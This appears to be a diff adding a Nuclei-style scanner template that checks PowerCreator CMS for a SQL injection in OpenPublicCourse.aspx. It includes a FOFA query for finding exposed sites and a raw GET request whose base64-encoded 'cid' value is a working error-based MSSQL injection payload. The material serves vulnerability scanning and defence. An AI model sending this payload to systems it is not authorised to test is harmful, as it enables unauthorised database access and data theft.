@@ -1,0 +1,30 @@
+id: PowerCreator-CMS-OpenPublicCourse_aspx-sql
+
+info:
+  name: "PowerCreator CMS OpenPublicCourse.aspx SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="PowerCreator-CMS"
+      PowerCreator CMS 的 OpenPublicCourse.aspx 接口存在可被利用的 SQL 注入缺陷。攻击者可通过构造恶意SQL查询，实现对数据库的未授权访问，潜在风险包括敏感数据泄露（如管理员凭据、用户隐私信息）及在具备高权限条件下向服务器写入恶意代码，最终可能导致系统权限被完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/y3GKFKpSeqoVGR7qfosHEw
+  tags: PowerCreator
+
+http:
+- raw:
+  - |
+    GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '0xe10adc3949ba59abbe56e057f20f883e'
+    - '转换成数据类型 int 时失败'
+    condition: and
+  - type: status
+    status:
+    - 500
